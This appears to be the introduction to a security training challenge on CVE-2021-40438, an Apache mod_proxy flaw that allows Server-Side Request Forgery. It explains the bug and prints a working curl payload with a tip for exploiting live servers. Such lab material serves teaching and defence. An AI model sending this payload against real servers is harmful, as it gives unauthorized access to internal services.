## Introduction
-->This challenge covers how to trigger a Server-Side Request Forgery by leveraging CVE-2021-40438
-->This challenge covers the vulnerability CVE-2021-40438, this issue can be used to trigger a Server-Side Request Forgery and gain access to internal or external applications.
-->An in-depth analysis of the bug have been written here: [Building a POC for CVE-2021-40438](https://firzen.de/building-a-poc-for-cve-2021-40438).
-->The gist of it is that:
 
-   mod_proxy searches anywhere in the URL instead of at the start of the URL for the handler `unix:`.
  
-   a long URL allows an attacker to set the unix domain socket to null and gets Apache to load the URL following it.
  
-   The final payload looks something like:
```shell
$ curl  "http://[SERVER]/?unix:$(perl -e 'print("A"x7000)')|http://www.google.com/"
```
-->For this challenge, connection reuse has been disabled to make exploitation more reliable. In a live environment, you may have to try multiple times or wait for Apache to be restarted to gain access to interesting services.
